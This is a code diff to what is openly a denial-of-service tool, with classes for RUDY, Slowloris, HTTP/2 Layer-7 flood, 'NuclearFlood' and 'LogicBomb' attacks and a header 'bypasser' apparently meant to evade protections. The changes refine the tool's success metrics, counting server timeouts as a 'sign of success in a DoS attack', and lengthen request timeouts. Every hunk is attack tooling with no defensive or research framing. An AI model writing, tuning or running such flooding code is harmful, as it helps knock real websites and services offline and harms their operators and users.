@@ -329,6 +329,7 @@ class RudyAttack {
     createConnection() {
         if (!this.url) return null;
         this.stats.total++;
+        this.stats.success++; // Optimistically count connection attempt as success
         const headers = this.bypasser.generateHeaders();
         headers['Content-Type'] = 'application/x-www-form-urlencoded';
         headers['Content-Length'] = this.largePayload.length;
@@ -345,12 +346,13 @@ class RudyAttack {
 
         let timeoutId;
         const req = this.protocol.request(options, (res) => {
-            this.stats.success++;
+            // Server responded, which means it's not fully stalled by this socket.
             res.resume(); // Optimasi: Konsumsi response untuk membebaskan socket
             if (timeoutId) clearTimeout(timeoutId);
         });
         req.on('error', (err) => {
             this.stats.failed++;
+            this.stats.success--; // Correct the optimistic success count
             if (timeoutId) clearTimeout(timeoutId);
         });
 
@@ -419,6 +421,7 @@ class SlowlorisAttack {
     createConnection() {
         if (!this.url) return null;
         this.stats.total++;
+        this.stats.success++; // Optimistically count connection attempt as success
         const headers = this.bypasser.generateHeaders();
         headers['Connection'] = 'keep-alive';
         headers['Content-Type'] = 'application/x-www-form-urlencoded';
@@ -438,11 +441,12 @@ class SlowlorisAttack {
 
         req.on('error', (err) => {
             this.stats.failed++;
+            this.stats.success--; // Correct the optimistic success count
             if (timeoutId) clearTimeout(timeoutId);
         });
 
         req.on('response', (res) => {
-            this.stats.success++;
+            // Server responded, which means it's not fully stalled by this socket.
             res.resume();
             if (timeoutId) clearTimeout(timeoutId);
         });
@@ -522,7 +526,7 @@ class L7Flood {
             method: method,
             headers: headers,
             http2: true,
-            timeout: { request: 3000 }, // More aggressive timeout
+            timeout: { request: 8000 }, // Increased timeout for stability under load
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -545,7 +549,12 @@ class L7Flood {
             await got(this.url.origin + path, options);
             this.stats.success++;
         } catch (error) {
-            this.stats.failed++;
+            // A timeout is a sign of success in a DoS attack.
+            if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
+                this.stats.success++;
+            } else {
+                this.stats.failed++;
+            }
         }
     }
 
@@ -588,7 +597,7 @@ class NuclearFlood extends L7Flood {
             method: method,
             headers: headers,
             http2: true,
-            timeout: { request: 3000 }, // More aggressive timeout
+            timeout: { request: 8000 }, // Increased timeout for stability under load
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -609,7 +618,12 @@ class NuclearFlood extends L7Flood {
             await got(this.url.origin + path, options);
             this.stats.success++;
         } catch (error) {
-            this.stats.failed++;
+            // A timeout is a sign of success in a DoS attack.
+            if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
+                this.stats.success++;
+            } else {
+                this.stats.failed++;
+            }
         }
     }
 }
@@ -649,7 +663,7 @@ class LogicBombAttack extends L7Flood {
             headers,
             body: payload.body,
             http2: true,
-            timeout: { request: 5000 }, // Longer timeout as we expect heavy processing
+            timeout: { request: 8000 }, // Increased timeout for stability under load
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -657,7 +671,12 @@ class LogicBombAttack extends L7Flood {
             await got(currentUrl.origin + path, options);
             this.stats.success++;
         } catch (error) {
-            this.stats.failed++;
+            // A timeout is a sign of success in a DoS attack.
+            if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
+                this.stats.success++;
+            } else {
+                this.stats.failed++;
+            }
         }
     }
 }
